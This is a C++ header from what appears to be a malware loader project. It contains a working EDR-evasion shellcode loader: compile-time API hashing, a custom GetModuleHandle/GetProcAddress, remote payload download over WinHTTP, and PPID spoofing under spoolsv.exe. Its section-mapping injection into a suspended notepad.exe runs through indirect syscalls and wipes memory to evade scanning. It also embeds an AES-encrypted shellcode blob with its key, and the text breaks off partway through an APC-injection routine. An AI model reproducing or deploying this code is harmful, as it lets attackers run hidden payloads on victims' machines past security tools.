#pragma once
#include <Windows.h>
#include <winternl.h>
#include <iostream> 
#include <tlhelp32.h>
#include <tchar.h>
#include <vector>
#include <winhttp.h>
#include <psapi.h>
#include <cassert>
#include <ntstatus.h>
#pragma comment(lib, "winhttp.lib")





// Structures definitions
typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateThreadEx)(_Out_ PHANDLE hThread, _In_  ACCESS_MASK DesiredAccess, _In_  LPVOID ObjectAttributes, _In_  HANDLE ProcessHandle, _In_  LPTHREAD_START_ROUTINE lpStartAddress, _In_  LPVOID lpParameter, _In_  BOOL CreateSuspended, _In_  DWORD StackZeroBits, _In_  DWORD SizeOfStackCommit, _In_  DWORD SizeOfStackReserve, _Out_ LPVOID lpBytesBuffer);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtWriteVirtualMemory)(_In_ HANDLE ProcessHandle, _In_opt_ PVOID BaseAddress, _In_ VOID* Buffer, _In_ SIZE_T BufferSize, _Out_opt_ PSIZE_T NumberOfBytesWritten);
typedef public NTSTATUS(NTAPI* _NtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
typedef public NTSTATUS(NTAPI* _NtQueryInformationThread) (IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG ReturnLength);
typedef public NTSTATUS(NTAPI* _NtCreateSection)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes, IN OPTIONAL PLARGE_INTEGER MaximumSize, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN OPTIONAL HANDLE FileHandle);
typedef public NTSTATUS(NTAPI* _NtMapViewOfSection)(IN HANDLE SectionHandle, IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG_PTR ZeroBits, IN SIZE_T CommitSize, IN OUT OPTIONAL PLARGE_INTEGER SectionOffset, IN OUT PSIZE_T ViewSize, IN DWORD InheritDisposition, IN ULONG AllocationType, IN ULONG Win32Protect);
typedef public NTSTATUS(NTAPI* _NtUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress OPTIONAL);
typedef enum _SECTION_INHERIT : DWORD { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT, * PSECTION_INHERIT;
typedef public NTSTATUS(NTAPI* _NtQueueApcThread)(HANDLE TargetThread, PVOID ApcRoutine, PVOID Argument1, PVOID Argument2, PVOID Argument3, ULONG ApcReserved);

using myNtTestAlert = NTSTATUS(NTAPI*)();






// Compile Time Functions definitions
// Credits to MALDEVACADEMY
// Generate a random key at compile time which is used as the initial hash
constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

// The compile time random seed
constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

// Compile time Djb2 hashing function (ASCII)
#define SEED 5
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }
    return Hash;
}

// runtime hashing macros
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
constexpr auto ntcreate_Rotr32A = HashStringDjb2A("NtCreateSection");
constexpr auto ntmap_Rotr32A = HashStringDjb2A("NtMapViewOfSection");
constexpr auto ntunmap_Rotr32A = HashStringDjb2A("NtUnmapViewOfSection");
constexpr auto ntalloc_Rotr32A = HashStringDjb2A("NtAllocateVirtualMemory");
constexpr auto ntprotect_Rotr32A = HashStringDjb2A("NtProtectVirtualMemory");
constexpr auto ntcreatethread_Rotr32A = HashStringDjb2A("NtCreateThreadEx");
constexpr auto ntwrite_Rotr32A = HashStringDjb2A("NtWriteVirtualMemory");
constexpr auto ntquery_Rotr32A = HashStringDjb2A("NtQueryInformationThread");
constexpr auto ntqueue_Rotr32A = HashStringDjb2A("NtQueueApcThread");

// static variables
char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
char sntdll[] = { '.','t','e','x','t',0 };
char _ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };



// Syscalls variables definitions
EXTERN_C DWORD syscallID = 0;
EXTERN_C UINT_PTR syscallAddr = 0;

// ASM functions definitions
extern "C" VOID indirect_sys(...);








// Static functions definitions

/**
* Credits to MALDEVACADEMY
* Compares two strings (case insensitive)
*/
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {
    WCHAR   lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int		len1 = lstrlenW(Str1),
        len2 = lstrlenW(Str2);

    int		i = 0,
        j = 0;
    // Checking length. We dont want to overflow the buffers
    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;
    // Converting Str1 to lower case string (lStr1)
    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(Str1[i]);
    }
    lStr1[i++] = L'\0'; // null terminating
    // Converting Str2 to lower case string (lStr2)
    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(Str2[j]);
    }
    lStr2[j++] = L'\0'; // null terminating
    // Comparing the lower-case strings
    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;
    return FALSE;
}





/**
* Credits to MALDEVACADEMY
* Retrieves the base address of a module from the PEB
* and enumerates the linked list of modules to find the correct one.
*/
HMODULE CustomGetModuleHandle(IN char szModuleName[]) {
    // convert char to LPCWSTR
    int wideStrLen = MultiByteToWideChar(CP_UTF8, 0, szModuleName, -1, nullptr, 0);
    wchar_t* wideStr = new wchar_t[wideStrLen];
    MultiByteToWideChar(CP_UTF8, 0, szModuleName, -1, wideStr, wideStrLen);
    LPCWSTR lpWideStr = wideStr;
    // Getting PEB
#ifdef _WIN64 // if compiling as x64
    PPEB			pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
    PPEB			pPeb = (PEB*)(__readfsdword(0x30));
#endif// Getting Ldr
    PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    // Getting the first element in the linked list which contains information about the first module
    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
    while (pDte) {
        // If not null
        if (pDte->FullDllName.Length != NULL) {
            // Check if both equal
            if (IsStringEqual(pDte->FullDllName.Buffer, lpWideStr)) {
                //wprintf(L"[+] Module found from PEB : \"%s\" \n", pDte->FullDllName.Buffer);
                return(HMODULE)pDte->Reserved2[0];
            }
        }
        else {
            break;
        }
        // Next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    wprintf(L"[+] Module not found in PEB");
    return NULL;
}




/** 
* Credits to MALDEVACADEMY
* Retrieves the address of an exported function from a specified module handle. 
* The function returns NULL if the function name is not found in the specified module handle.
*/
FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName) {
    if (hModule == NULL)
		return NULL;
    // We do this to avoid casting at each time we use 'hModule'
    PBYTE pBase = (PBYTE)hModule;
    // Getting the dos header and doing a signature check
    PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    // Getting the nt headers and doing a signature check
    PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;
    // Getting the optional header
    IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;
    // Getting the image export table
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    // Getting the function's names array pointer
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    // Getting the function's addresses array pointer
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    // Getting the function's ordinal array pointer
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
    // Looping through all the exported functions
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        // Getting the name of the function
        char* pFunctionName = (char*)(pBase + FunctionNameArray[i]);

        // Getting the address of the function through its ordinal
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
        
        // Searching for the function specified
        if (lpApiName == RTIME_HASHA(pFunctionName)) {
            //printf("\t[+] Function %s found at address 0x%p with ordinal %d\n", pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return (FARPROC)pFunctionAddress;
        }
    }
    printf("\n\t[!] Function with hash %lu not found\n", lpApiName);
    return NULL;
}







/**
*   Download a raw payload from an external website into a buffer
*/
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
    printf("[+] Downloading remote payload\n");
    HINTERNET hSession = WinHttpOpen(NULL,WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,WINHTTP_FLAG_SECURE_DEFAULTS);
    HINTERNET hConnect = WinHttpConnect(hSession,baseAddress,INTERNET_DEFAULT_HTTPS_PORT,0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,L"GET",filename,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
    WinHttpReceiveResponse(hRequest,NULL);
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;
    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return buffer;
}





/**
*   Check all running processes to find the PID of the spoolsv process
*/
DWORD GetPID() {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &processEntry)) {
            do {
                if (_tcsicmp(processEntry.szExeFile, _T("spoolsv.exe")) == 0) {
                    printf("[+] Retrieving spoolsv PID : %lu\n", processEntry.th32ProcessID);
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}






/*
* Credits to am0nsec
* https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
*/
PVOID CustomMemMove(PVOID dest, const PVOID src, SIZE_T len) {
    char* d = (char* )dest;
    const char* s = (char*)src;
    if (d < s)
        while (len--)
            *d++ = *s++;
    else {
        char* lasts = (char*)s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}








// Credits to reenz0h  - @SEKTOR7net
int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
        return -1;
    }
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    return 0;
}














/**
*   Execute our raw payload by creating a suspended process (Process Hollowing)
*   with a custom thread attribute list to spoof its parent PID (PPID spoofing)
*   and creating a new section into our child process memory to copy our shellcode
*   and finally restore closing the delete-pending state to execute our payload
*/
void raw_exec_ppid(std::vector<BYTE> sh, DWORD exPID) {
    printf("[+] Opening a handle on spoolsv process\n");
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, exPID);
    LPVOID ptr = &sh[0];
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
    printf("[+] Creating suspended process with PPID spoofing\n");
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    HMODULE hNtdll = CustomGetModuleHandle(_ntdll);

    
    FARPROC pNtCreateSection = CustomGetProcAddress(hNtdll, ntcreate_Rotr32A);
    UINT_PTR pNtCreateSectionSyscallID = (UINT_PTR)pNtCreateSection + 4;
    syscallID = ((unsigned char*)(pNtCreateSectionSyscallID))[0];
    printf("[+] Syscall value of NtCreateSection : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtCreateSection + 0x12;
    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { sh.size() };
    printf("[+] Creating new section through indirect syscall\n");
    indirect_sys(&hSection, SECTION_ALL_ACCESS, NULL, &szSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);


    FARPROC pNtMapViewOfSection = CustomGetProcAddress(hNtdll, ntmap_Rotr32A);
    UINT_PTR pNtMapViewOfSectionSyscallID = (UINT_PTR)pNtMapViewOfSection + 4;
    syscallID = ((unsigned char*)(pNtMapViewOfSectionSyscallID))[0];
    printf("[+] Syscall value of NtMapViewOfSection : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtMapViewOfSection + 0x12;
    // map section into memory of our local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;
    indirect_sys(hSection, GetCurrentProcess(), &hLocalAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
    printf("[+] Mapping new section through indirect syscall\n");      

    // copy shellcode into our local memory
    CustomMemMove(hLocalAddress, ptr, sh.size());
    printf("[+] Copying shellcode into our new local section\n");

    // map section into memory of suspended child process
    PVOID hRemoteAddress = NULL;
    printf("[+] Adding new section with shellcode\n");

    indirect_sys(hSection, victimProcess, &hRemoteAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
    printf("[+] Copying local section to victim process through indirect syscall\n");


    // wiping our current process memory to avoid memory scanning
    printf("[+] Cleaning local memory\n");
    memset(&sh, 0, sizeof(sh));
    memset(&hLocalAddress, 0, sizeof(hLocalAddress));


    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    printf("[+] Creating new thread\n");

    GetThreadContext(threadHandle, pContext);
    // update rcx context to execute our payload
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(threadHandle, pContext);
    printf("[+] Resuming execution\n");
    ResumeThread(threadHandle);

    FARPROC pNtUnmapViewOfSection = CustomGetProcAddress(hNtdll, ntunmap_Rotr32A);
    UINT_PTR pNtUnmapViewOfSectionSyscallID = (UINT_PTR)pNtUnmapViewOfSection + 4;
    syscallID = ((unsigned char*)(pNtUnmapViewOfSectionSyscallID))[0];
    printf("[+] Syscall value of NtUnmapViewOfSection : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtUnmapViewOfSection + 0x12;
    indirect_sys(victimProcess, hLocalAddress);
    printf("[+] Unmapping local section through indirect syscall\n");
}


















/**
*   Execute our encrypted payload through indirect syscalls and APC injection
*/
void IndirectAPC() {

    // Define your own payload here :

    char AESkey[] = { 0xa5, 0xfc, 0xd8, 0x10, 0x59, 0x58, 0x4e, 0x91, 0x8d, 0xf2, 0x87, 0x55, 0x9c, 0xdb, 0xdb, 0x23 };
    char payload[] = { 0x37, 0xe9, 0x43, 0x3e, 0x8e, 0x49, 0x3b, 0xb4, 0xe5, 0xa3, 0xa8, 0x75, 0x17, 0xf1, 0xc0, 0x7, 0x9c, 0xf9, 0x90, 0x63, 0xb8, 0xab, 0x95, 0xef, 0xe9, 0xee, 0x27, 0xe0, 0x83, 0xd8, 0x8, 0x96, 0x6c, 0xe1, 0x27, 0xd8, 0x99, 0x94, 0x9d, 0x0, 0x12, 0xcd, 0xfa, 0x17, 0xe6, 0xc7, 0xba, 0x9c, 0x25, 0xaa, 0x80, 0x9, 0x94, 0x57, 0xd0, 0xab, 0xc7, 0xc7, 0x2b, 0xb5, 0x7d, 0x25, 0xc2, 0xd4, 0x81, 0xf9, 0xe4, 0x3d, 0x30, 0x44, 0x91, 0xc0, 0x99, 0xdc, 0xc4, 0xdc, 0x1, 0x59, 0xcd, 0xec, 0xe6, 0x7c, 0x38, 0x84, 0xf2, 0xf4, 0xed, 0xc4, 0xf, 0x19, 0xf2, 0xc0, 0xfb, 0x9, 0xcd, 0x2, 0x34, 0x89, 0x6d, 0xe0, 0xf4, 0x55, 0x41, 0xf5, 0xc8, 0x21, 0x95, 0x1e, 0xc9, 0x31, 0xfb, 0x7f, 0x98, 0x7c, 0xd6, 0x35, 0x65, 0x82, 0xf7, 0x3e, 0xb, 0x5b, 0x4b, 0xbd, 0x63, 0xb1, 0x1d, 0xb, 0x14, 0xc7, 0x33, 0x68, 0x58, 0xc8, 0x70, 0x9b, 0xdf, 0x38, 0x5f, 0x4c, 0xf7, 0xa0, 0xd3, 0x14, 0xce, 0x5e, 0xc7, 0x4f, 0x9, 0xd6, 0xdf, 0xbc, 0xde, 0xee, 0xaa, 0xd8, 0x57, 0xa4, 0x3a, 0x64, 0x43, 0x93, 0x39, 0x12, 0x3d, 0x3d, 0xa4, 0xbd, 0xcf, 0x47, 0x4b, 0x13, 0xe2, 0x71, 0xa5, 0x5d, 0x74, 0x13, 0xaa, 0xbb, 0x73, 0x11, 0x59, 0xcd, 0x80, 0xf5, 0xe4, 0x11, 0x2a, 0x1f, 0xb6, 0x8d, 0x8d, 0xde, 0xe8, 0x8b, 0x14, 0x80, 0x22, 0x70, 0x19, 0x45, 0xad, 0x62, 0x8d, 0xfb, 0x40, 0xb9, 0x52, 0x7c, 0x4e, 0xdf, 0x69, 0xbd, 0x31, 0x1f, 0x5f, 0xeb, 0x58, 0xce, 0xdd, 0xbc, 0x7b, 0x71, 0x2d, 0x8a, 0x9a, 0x82, 0xb7, 0xf6, 0xe4, 0xaa, 0x57, 0xc5, 0xbe, 0xf3, 0x69, 0x8f, 0x67, 0x12, 0xe8, 0x17, 0xef, 0xfc, 0x31, 0xf7, 0x64, 0xac, 0x1, 0xb3, 0x46, 0xdb, 0x7, 0x92, 0xe9, 0x2b, 0x2f, 0x18, 0xee, 0x9b, 0xb4, 0x93, 0x7d, 0xf2, 0x29, 0x72, 0xe8, 0x5, 0x9e, 0x38, 0xfe, 0xe5, 0x4a, 0x88, 0x42, 0xcc, 0x37, 0xeb, 0x12, 0xc7, 0x99, 0x15, 0x99, 0xd9, 0xaf, 0xb4, 0x5a, 0xf7, 0x7a, 0x45, 0x8, 0x6b, 0x2b, 0xf2, 0x62, 0xfd, 0xf0, 0xb9, 0x3b, 0xe9, 0x20, 0xdd, 0x3e, 0x8e, 0xc0, 0x78, 0xa, 0xdc, 0x90, 0xd8, 0xe1, 0xfc, 0x9a, 0x54, 0x26, 0x86, 0xee, 0xe4, 0x6, 0xd6, 0xb4, 0xfa, 0x16, 0x9f, 0x10, 0x59, 0x10, 0xe3, 0xc4, 0xe6, 0x67, 0x40, 0xfe, 0x64, 0xf5, 0xc8, 0xf6, 0x2d, 0x3b, 0xb3, 0xce, 0xa5, 0x83, 0x38, 0x7b, 0x4a, 0xe0, 0x4c, 0xab, 0x45, 0x78, 0xff, 0xbd, 0xd8, 0xd0, 0x1, 0x3c, 0x87, 0x83, 0xf5, 0x86, 0x7e, 0x4d, 0x90, 0xa5, 0x16, 0x34, 0xbb, 0x41, 0x48, 0x81, 0x13, 0xf6, 0xad, 0xd7, 0x8f, 0xd6, 0x3e, 0x3b, 0x3, 0xda, 0x53, 0xc1, 0xbe, 0x76, 0x8, 0xe5, 0xba, 0x39, 0x38, 0x29, 0x7f, 0xbf, 0x8c, 0xa0, 0x73, 0x50, 0x63, 0xe9, 0x13, 0xe6, 0x65, 0x39, 0x2a, 0xbe, 0x82, 0x26, 0x5e, 0x3f, 0xc, 0x57, 0x22, 0x99, 0x96, 0x11, 0x49, 0xf2, 0x3b, 0x40, 0xaa, 0xbe, 0xc6, 0x19, 0x37, 0x8, 0x44, 0x6a, 0x56, 0x2, 0x1f, 0xfa, 0x1d, 0x6e, 0xe4, 0x94, 0xed, 0x5d, 0x2, 0x82, 0x98, 0xf1, 0xc8, 0x2b, 0xfc, 0x3f, 0xcd, 0xf9, 0xc9, 0xf1, 0xc1, 0x45, 0xfe, 0x9c, 0xab, 0x2f, 0x6, 0xb, 0x71, 0x1, 0x85, 0xa5, 0xb0, 0x9a, 0xcb, 0xe7, 0x97, 0x64, 0x7c, 0x3b, 0x35, 0xaa, 0xf5, 0x96, 0x4e, 0xb6, 0xc5, 0xd9, 0xbb, 0x66, 0x7, 0xf7, 0xf3, 0x1c, 0xd8, 0x29, 0x69, 0x32, 0x17, 0xf7, 0x9b, 0x9e, 0x53, 0x28, 0xc9, 0xec, 0x43, 0x3d, 0xb4, 0x99, 0x45, 0xad, 0xf0, 0xe6, 0x16, 0x4d, 0xc3, 0x48, 0x87, 0x9d, 0x15, 0xcc, 0x16, 0x96, 0x2a, 0xed, 0x67, 0xfe, 0x3d, 0x4d, 0x4d, 0x4c, 0x6e, 0x2e, 0x4, 0x50, 0xf7, 0x3, 0xa4, 0x26, 0x5e, 0xae, 0x7, 0x5f, 0xd7, 0x13, 0xe5, 0xba, 0xf0, 0x9b, 0xa, 0x8b, 0x7, 0xb, 0xe8, 0x45, 0x17, 0x3, 0x3d, 0x3e, 0x66, 0xa7, 0xea, 0x50, 0xa4, 0xd2, 0xfd, 0x8f, 0xd6, 0x45, 0x7f, 0xee, 0x7c, 0x2a, 0x7b, 0x81, 0x85, 0xec, 0x83, 0xf9, 0x17, 0xd7, 0x18, 0x44, 0xd5, 0x60, 0x4, 0xdf, 0xdf, 0xfe, 0x36, 0xb2, 0xfb, 0xf6, 0xbd, 0x33, 0xae, 0xe4, 0xfe, 0xb9, 0x97, 0x3f, 0xe6, 0x10, 0x50, 0x7d, 0x55, 0xae, 0x46, 0xeb, 0x17, 0xf4, 0x9c, 0x38, 0x5, 0xfe, 0xca, 0xac, 0x41, 0xe9, 0x79, 0xc, 0x64, 0xcd, 0xe4, 0x68, 0x29, 0x2f, 0xde, 0x31, 0x70, 0x43, 0xc6, 0x35, 0x9d, 0x34, 0x8f, 0x3, 0xf9, 0x96, 0xb4, 0xbc, 0x67, 0xa, 0x9a, 0x85, 0x8e, 0x6c, 0xd3, 0xa5, 0xb6, 0xb7, 0x0, 0xc3, 0x7f, 0x89, 0xd8, 0x49, 0x39, 0x22, 0xa9, 0x2a, 0xb9, 0x28, 0xc5, 0x68, 0x27, 0x1, 0x5e, 0x61, 0xbf, 0xcd, 0x6c, 0x75, 0xe3, 0xcf, 0x53, 0xb6, 0xf6, 0x30, 0x8e, 0x48, 0x52, 0x8f, 0xf1, 0x23, 0x48, 0xd, 0x9e, 0x65, 0x2a, 0xb, 0x8, 0xce, 0xfb, 0x34, 0x4e, 0xc3, 0x91, 0xe6, 0xe0, 0xd7, 0xee, 0x2b, 0x3, 0xe5, 0x4f, 0x4b, 0x22, 0xe0, 0xa7, 0xbb, 0x33, 0x67, 0xa9, 0xe, 0xdd, 0xe4, 0x7a, 0xcf, 0x79, 0x82, 0x82, 0x82, 0x63, 0xf5, 0x40, 0xab, 0xbd, 0x8c, 0x5a, 0x1f, 0xc1, 0xbc, 0xff, 0x13, 0x84, 0xdf, 0x28, 0xc1, 0x64, 0xdd, 0x15, 0x75, 0xb8, 0x18, 0xea, 0xf, 0x47, 0xf8, 0x67, 0x78, 0x74, 0x4a, 0xa7, 0x6c, 0xa0, 0xce, 0x2, 0x61, 0x57, 0x6f, 0x13, 0x52, 0x5b, 0x4c, 0x9b, 0xf9, 0xc2, 0xd8, 0x4b, 0x9c, 0xf, 0x70, 0xce, 0xf4, 0x73, 0x65, 0x4a, 0x8f, 0xf3, 0x7c, 0xa4, 0x6d, 0x84, 0x42, 0xd0, 0x9f, 0xdd, 0xe, 0x90, 0xe3, 0xf1, 0x3b, 0xa9, 0xa6, 0x30, 0x22, 0xe0, 0x9c, 0x10, 0xcb, 0x84, 0xa3, 0xfa, 0xfe, 0x44, 0x5e, 0x71, 0xab, 0xee, 0xeb, 0x13, 0xfc, 0xfc, 0x7f, 0xcf, 0xc, 0x57, 0x8, 0xb3, 0x56, 0x94, 0xe2, 0xed, 0x12, 0x7e, 0xf5, 0xf6, 0xff, 0x9c, 0x30, 0x41, 0x19, 0x94, 0x73, 0xcd, 0x38, 0x32, 0x42, 0x16, 0x57, 0xd3, 0xb8, 0xa2, 0x98, 0xd8, 0xb7, 0xdb, 0xa9, 0xe4, 0x9, 0x37, 0x8d, 0x6e, 0xea, 0x7e, 0x2e, 0x61, 0x89, 0xa7, 0x29, 0xa3, 0x9, 0x6c, 0xf1, 0xda, 0x10, 0x69, 0xaf, 0xe4, 0xdc, 0x73, 0x36, 0x34, 0x3e, 0xf2, 0x3f, 0x4, 0xf0, 0xfa, 0x40, 0xd3, 0x8b, 0x2b, 0xe7, 0x56, 0xa5, 0x6c, 0xf2, 0x69, 0x7d, 0x3d, 0x29, 0x1, 0x8, 0x4f, 0xfc, 0xb4, 0x70, 0xac, 0xf3, 0x35, 0xda, 0xa, 0x4e, 0x31, 0x95, 0x6, 0x19, 0x2c, 0x4a, 0x89, 0x72, 0x21, 0x2, 0x83, 0x6e, 0xc0, 0xa1, 0xaa, 0xde, 0x8, 0xa2, 0x80, 0x1f, 0x6e, 0xa7, 0x3f, 0x9e, 0x12, 0xb5, 0xdd, 0xa5, 0xcc, 0xc1, 0xb3, 0xc6, 0x2a, 0x39, 0xa, 0x1f, 0x86, 0x25, 0x7a, 0x45, 0x34, 0x42, 0xd0, 0xcd, 0x9, 0x79, 0xce, 0x9, 0x86, 0x72, 0x33, 0x9, 0x9e, 0x4b, 0xec, 0x29, 0x9a, 0x10, 0x36, 0x6d, 0xfd, 0x77, 0xff, 0x37, 0x7 };


    // Getting handle on ntdll module
    printf("[+] Getting custom handle on ntdll module\n");
    HMODULE hNtdll = CustomGetModuleHandle(_ntdll);

    // Getting address of NtAllocateVirtualMemory
    printf("\n[+] Getting address of NtAllocateVirtualMemory\n");
    FARPROC pNtAllocateVirtualMemory = CustomGetProcAddress(hNtdll, ntalloc_Rotr32A);
    // Getting syscall value of NtAllocateVirtualMemory
    UINT_PTR pNtAllocateVirtualMemorySyscallID = (UINT_PTR)pNtAllocateVirtualMemory + 4; // The syscall ID is typically located at the 4th byte of the function
    syscallID = ((unsigned char*)(pNtAllocateVirtualMemorySyscallID))[0];
    printf("[+] Syscall value of NtAllocateVirtualMemory : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtAllocateVirtualMemory + 0x12; // (18 in decimal)
    printf("[+] Address of NtAllocateVirtualMemory syscall instruction in ntdll memory : 0x%p\n", syscallAddr);

    PVOID allocBuffer = NULL;
    SIZE_T buffSize = sizeof(payload);
    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
    printf("[+] Allocating memory for the shellcode with indirect syscall\n");
    indirect_sys((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated memory address : 0x%p\n", allocBuffer);

    // Getting address of NtWriteVirtualMemory
    printf("\n[+] Getting address of NtWriteVirtualMemory\n");
    FARPROC pNtWriteVirtualMemory = CustomGetProcAddress(hNtdll, ntwrite_Rotr32A);
    // Getting syscall value of NtWriteVirtualMemory
